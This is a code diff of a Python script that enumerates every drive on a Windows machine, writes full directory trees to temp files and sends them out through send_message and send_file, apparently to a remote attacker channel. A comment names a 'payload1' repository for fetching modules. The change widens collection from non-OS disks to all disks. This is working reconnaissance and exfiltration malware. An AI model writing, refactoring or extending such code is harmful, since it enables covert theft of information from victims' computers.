@@ -106,34 +106,28 @@ def tree(directory, file, prefix=''):
             connector = '├── ' if index < len(contents) - 1 else '└── '
             file.write(prefix + connector + name + '\n')
 
+def process_path(letterpath, parameter):
+    with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
+        tree(letterpath, temp_file)
+        temp_file_path = temp_file.name
+    print(f"{letterpath} : {temp_file_path}")
+    send_message(letterpath)
+    send_file(temp_file_path)
+
 def disk_tree(parameter):
     maj_letters = list(string.ascii_uppercase)
-    for maj_letters in maj_letters:
-        letterpath = str(maj_letters) + ":\\"
+    for maj_letter in maj_letters:
+        letterpath = f"{maj_letter}:\\"
         if os.path.isdir(letterpath):
             if parameter == 1:
-                with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
-                    tree(letterpath, temp_file)
-                    temp_file_path = temp_file.name
-                print(f"{letterpath} : {temp_file_path}")
-                send_message(letterpath)
-                send_file(temp_file_path)
-            if parameter == 2:
-                if os.path.isdir(letterpath + "Windows\\system32"):
-                    pass
-                elif os.path.isdir("/usr/bin"):
-                    pass
-                else:
-                    with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
-                        tree(letterpath, temp_file)
-                        temp_file_path = temp_file.name
-                    print(f"{letterpath} : {temp_file_path}")
-                    send_message(letterpath)
-                    send_file(temp_file_path)
+                process_path(letterpath, parameter)
+            elif parameter == 2:
+                if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
+                    process_path(letterpath, parameter)
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
 #Param 1 : for all disks
 #Param 2 : for no OS disks
-disk_tree(2)
+disk_tree(1)
